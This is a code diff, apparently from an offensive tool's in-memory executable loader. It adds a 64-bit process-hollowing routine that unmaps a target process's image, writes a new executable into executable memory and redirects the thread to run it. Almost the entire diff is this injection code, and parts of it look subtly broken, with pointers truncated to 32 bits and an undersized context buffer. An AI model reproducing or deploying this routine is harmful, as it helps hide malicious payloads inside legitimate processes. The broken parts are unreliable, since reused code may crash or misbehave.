@@ -46,11 +46,93 @@ BOOL MapNewExecutableRegionInProcess(
 // transfer of execution control the new executable in a seamless fashion.
 //
 #ifdef _WIN64
-// sf: we have to rewrite this for x64
-BOOL MapNewExecutableRegionInProcess( IN HANDLE TargetProcessHandle, IN HANDLE TargetThreadHandle, IN LPVOID NewExecutableRawImage )
+//
+// based on MemExec64 source by steve10120 [at] ic0de.org
+//	clever method of getting contextinformation for entry point data, x64 doesnt give us ThreadContext.Eax
+// adaptation for in-mem-exe.c by RageLtMan
+// TODO: add wow64 launcher, add src/target image arch checks
+//
+BOOL MapNewExecutableRegionInProcess(
+		IN HANDLE TargetProcessHandle,
+		IN HANDLE TargetThreadHandle,
+		IN LPVOID NewExecutableRawImage);
+
+typedef LONG (WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
+
+DWORD_PTR Align(DWORD_PTR Value, DWORD_PTR Alignment)
 {
-	return FALSE;
+    DWORD_PTR dwResult = Value;
+
+    if (Alignment > 0)
+    {
+        if ((Value % Alignment) > 0)
+            dwResult = (Value + Alignment) - (Value % Alignment);
+    }
+    return dwResult;
 }
+
+BOOL MapNewExecutableRegionInProcess(
+		IN HANDLE TargetProcessHandle,
+		IN HANDLE TargetThreadHandle,
+		IN LPVOID NewExecutableRawImage)
+{ 
+	PROCESS_INFORMATION       BasicInformation;
+	PIMAGE_SECTION_HEADER     SectionHeader;
+	PIMAGE_DOS_HEADER         DosHeader;
+	PIMAGE_NT_HEADERS         NtHeader64;
+	DWORD_PTR                 dwImageBase;
+    NtUnmapViewOfSection      pNtUnmapViewOfSection;
+    LPVOID                    pImageBase;
+    SIZE_T                    dwBytesWritten;
+    SIZE_T                    dwBytesRead;
+    int                       Count;
+	PCONTEXT                  ThreadContext;
+	BOOL                      Success = FALSE;
+
+	DosHeader = (PIMAGE_DOS_HEADER)NewExecutableRawImage;
+    if (DosHeader->e_magic == IMAGE_DOS_SIGNATURE)
+    {
+        NtHeader64 = (PIMAGE_NT_HEADERS64)((DWORD)NewExecutableRawImage + DosHeader->e_lfanew);
+        if (NtHeader64->Signature == IMAGE_NT_SIGNATURE)
+        {
+            RtlZeroMemory(&BasicInformation, sizeof(PROCESS_INFORMATION));
+            ThreadContext = (PCONTEXT)VirtualAlloc(NULL, sizeof(ThreadContext) + 4, MEM_COMMIT, PAGE_READWRITE);
+            ThreadContext = (PCONTEXT)Align((DWORD)ThreadContext, 4);
+            ThreadContext->ContextFlags = CONTEXT_FULL;
+            if (GetThreadContext(TargetThreadHandle, ThreadContext)) //used to be LPCONTEXT(ThreadContext)
+            {
+                ReadProcessMemory(TargetProcessHandle, (LPCVOID)(ThreadContext->Rdx + 16), &dwImageBase, sizeof(DWORD_PTR), &dwBytesRead);
+
+                pNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
+                if (pNtUnmapViewOfSection)
+                    pNtUnmapViewOfSection(TargetProcessHandle, (PVOID)dwImageBase);
+
+                pImageBase = VirtualAllocEx(TargetProcessHandle, (LPVOID)NtHeader64->OptionalHeader.ImageBase, NtHeader64->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+                if (pImageBase)
+                {
+                    WriteProcessMemory(TargetProcessHandle, pImageBase, (LPCVOID)NewExecutableRawImage, NtHeader64->OptionalHeader.SizeOfHeaders, &dwBytesWritten);
+                    SectionHeader = IMAGE_FIRST_SECTION(NtHeader64);
+                    for (Count = 0; Count < NtHeader64->FileHeader.NumberOfSections; Count++)
+                    {
+                        WriteProcessMemory(TargetProcessHandle, (LPVOID)((DWORD_PTR)pImageBase + SectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)NewExecutableRawImage + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, &dwBytesWritten);     
+                        SectionHeader++;
+                    }
+                    WriteProcessMemory(TargetProcessHandle, (LPVOID)(ThreadContext->Rdx + 16), (LPVOID)&NtHeader64->OptionalHeader.ImageBase, sizeof(DWORD_PTR), &dwBytesWritten);
+                    ThreadContext->Rcx = (DWORD_PTR)pImageBase + NtHeader64->OptionalHeader.AddressOfEntryPoint;
+                    SetThreadContext(TargetThreadHandle, (LPCONTEXT)ThreadContext);
+                    ResumeThread(TargetThreadHandle);
+					Success = TRUE;
+                }
+                else
+                    TerminateProcess(TargetProcessHandle, 0);
+            VirtualFree(ThreadContext, 0, MEM_RELEASE);
+            }
+        }
+    }
+
+	return Success;
+}
+
 #else
 BOOL MapNewExecutableRegionInProcess(
 		IN HANDLE TargetProcessHandle,
